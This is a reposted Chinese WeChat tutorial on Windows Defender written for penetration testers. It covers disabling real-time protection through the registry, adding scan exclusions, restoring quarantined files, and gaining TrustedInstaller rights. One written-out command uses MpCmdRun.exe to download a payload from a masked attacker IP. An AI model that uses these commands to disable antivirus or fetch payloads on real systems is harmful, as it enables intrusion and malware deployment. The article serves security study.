#  Windows Defender的一些渗透知识

[ Ms08067安全实验室 ](javascript:void\(0\);)

**Ms08067安全实验室** ![]()

微信号 Ms08067_com

功能介绍 “Ms08067安全实验室”致力于网络安全的普及和培训！

____

___发表于_

收录于合集

以下文章来源于Tide安全团队 ，作者komorebi

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM7f2r4cHKV0tKOK4v87qvAYZazjibgqC5HkYyaQeibGau4g/0)
**Tide安全团队** .

Tide安全团队以信安技术研究为目标，致力于分享高质量原创文章、开源安全工具、交流安全技术，研究方向覆盖网络攻防、Web安全、移动终端、安全开发、物联网/工控安全/AI安全等多个领域，对安全感兴趣的小伙伴可以关注我们。

  

## 前言

Microsoft Defender，最初称为Microsoft AntiSpyware，是微软推出的一款杀毒软件。相信大家对Windows
Defender
的防御性能还是没有怀疑的，毕竟最了解Windows系统的还得是微软自己。但是这货也比较令人头疼，毕竟它检测到问题直接就杀了，然后弹窗告诉用户“我已经拦截了一个XXX”。完全属于先斩后奏。今天正好看到大佬的文章，跟着学习一下Windows
defender相关的知识。

## 测试环境版本

系统：Windows server 2016 Windows defender版本：版本信息：反恶意软件容户端版本：4.10.14393.1794
引擎版本：1.1.19500.2 防病毒定义：1.373.1325.0 反间谍软件定义：1.373.1325.0 网络检查系统引擎版本：2.1.14600
4 网络检查系统定义版本：119.0.00 测试权限：administrator

![](https://gitee.com/fuli009/images/raw/master/public/20230223090353.png)

## 查看Windows defender版本

### 面板查看

设置-更新和安全-Windows Defender

![](https://gitee.com/fuli009/images/raw/master/public/20230223090355.png)

### 命令行查看

注：新版本Windows Defender已不适用

    
    
    dir "C:\ProgramData\Microsoft\Windows Defender\Platform\" /od /ad /b

![](https://gitee.com/fuli009/images/raw/master/public/20230223090356.png)

## 查看已存在的查杀排除列表

  * • 通过面板查看依次选择`设置-更新和安全-Windows Defender-添加排除项`如下图

![](https://gitee.com/fuli009/images/raw/master/public/20230223090357.png)

  * • 通过命令行查看`reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions" /s`

![](https://gitee.com/fuli009/images/raw/master/public/20230223090358.png)

  * • 通过Powershell查看`Get-MpPreference | select ExclusionPath`

![](https://gitee.com/fuli009/images/raw/master/public/20230223090359.png)

## 关闭Windows Defender的实时保护

1.通过面板关闭依次选择

    
    
    设置-更新和安全-Windows Defender-实时保护

![](https://gitee.com/fuli009/images/raw/master/public/20230223090400.png)

### 通过命令行关闭defender 实时保护

  * • 需要TrustedInstaller权限

  * • 需要关闭Tamper Protection`reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /d 1 /t REG_DWORD /f`

![](https://gitee.com/fuli009/images/raw/master/public/20230223090401.png)

注：通过命令行开启defender 实时保护

    
    
    reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /f

注：新版本的Windows已经不再适用

## 添加查杀排除列表

### 通过面板添加

依次选择 设置-更新和安全-Windows Defender-排除-添加排除项-选择排除的进程或文件类型&文件夹

  * • 该操作等价于修改注册表HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\的键值，具体位置如下：

类型文件对应注册表项TemporaryPaths 类型文件夹对应注册表项Paths 类型文件类型对应注册表项Extensions
类型进程对应注册表项Processes

### 通过命令行添加

利用条件:需要TrustedInstaller权限

    
    
    reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "c:\tide" /d 0 /t REG_DWORD /f

![](https://gitee.com/fuli009/images/raw/master/public/20230223090403.png)

## 恢复被隔离的文件

参考资料：https://docs.microsoft.com/en-us/microsoft-365/security/defender-
endpoint/command-line-arguments-microsoft-defender-
antivirus?view=o365-worldwide

### MpCmdRun.exe存在的位置

  * • 简介 mpcmdrun.exe 是 Microsoft Windows 安全系统的重要组成部分，可帮助保护您的 PC 免受在线威胁和恶意软件的侵害。如果您想自动化 Microsoft 安全防病毒，也可以使用此实用程序。.exe 必须从 Windows 命令提示符运行。在实验过三个不同的Windows版本后，发现微软在新版本已经更改了MpCmdRun的位置（具体哪个版本后更改的不清楚，在这两个路径下查找就对了） 更改后的位置在`C:\Program Files\Windows Defender\MpCmdRun.exe`老版本`dir "C:\ProgramData\Microsoft\Windows Defender\Platform\" /od /ad /b`得到版本号后，则他存在的位置为`C:\ProgramData\Microsoft\Windows Defender\Platform\<版本>`比如我这台存在的物理位置为

![]()

    
    
    C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2205.7-0\X86

### 常用命令

  * • 查看被隔离的文件列表`MpCmdRun -Restore -ListAll`

![](https://gitee.com/fuli009/images/raw/master/public/20230223090404.png)

  * • 恢复指定名称的文件至原目录`MpCmdRun -Restore -FilePath C:\tide\7.exe`

  * • 恢复所有文件至原目录`MpCmdRun -Restore -All`

![](https://gitee.com/fuli009/images/raw/master/public/20230223090405.png)

  * • 查看指定路径是否位于排除列表中`MpCmdRun -CheckExclusion -path C:\test`

## 补充1：获取TrustedInstaller权限

### AdvancedRun

AdvancedRun是运行于Windows系统的轻量级程序设置优先级软件，可以轻松设置程序运行优选级，并且还能够支持通过命令行调用设置，也支持将参数保存为配置文件，以便于更好进行使用。在图形化界面

![](https://gitee.com/fuli009/images/raw/master/public/20230223090406.png)

或者使用命令行

    
    
    AdvancedRun.exe /EXEFilename "%windir%\system32\cmd.exe" /CommandLine '/c reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /d 1 /t REG_DWORD /f' /RunAs 8 /Run

## 补充2：MpCmdRun.exe利用

### MpCmdRun恶意文件下载

Windows
Defender自带的命令执行工具"MpCmdRun.exe"可以用来实现远程下载恶意文件的目的，但是免杀好像还是不太可靠，不过我们可以在cmd中关闭Windows
Defender，所以这样一来，一结合就变得有意思多了，不管在使用该思路的过程中还需要权限提升，但是CS因为在后渗透测试中有很好的辅助功能，所以总体来说还是划算的~
PS：经过实验发现在新版本中下载任何文件Windows
defender都会报毒并隔离（下图），若尝试关闭实时保护则mpcmdrun不可用。。。不过老版本defender还是可以的。在目标主机上使用Windows
Defender自带的MpCmdRun.exe程序下载恶意文件

    
    
    MpCmdRun.exe -DownloadFile -url http://*.*.*.*:81/co.exe -path c:\co.exe

![](https://gitee.com/fuli009/images/raw/master/public/20230223090407.png)

### MpCmdRun.exe解密和加载Cobalt Strike攻击载荷

这篇文章是7月底发布的，还算比较新（在我10月份写这篇文章的时候）。https://www.bleepingcomputer.com/news/security/lockbit-
ransomware-abuses-windows-defender-to-load-cobalt-strike/
一开始还以为是生成含有恶意载荷的dll文件替为MPClient.dll后就可以执行，结果在自己机器上尝试了一下根本不能上线，仔细看了看（谷歌翻译后）才明白大意是攻击者通过MpCmdRun.exe
加载修改后的MPClient.dll执行c0000015.log进而实现上线Cobalt
Strike，当然这就触及到我的知识盲区了，感兴趣的铁子可以继续研究一下（教教我）。

![](https://gitee.com/fuli009/images/raw/master/public/20230223090410.png)

## 参考文章

https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-Windows-
Defender

![](https://gitee.com/fuli009/images/raw/master/public/20230223090411.png)

E

N

D

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

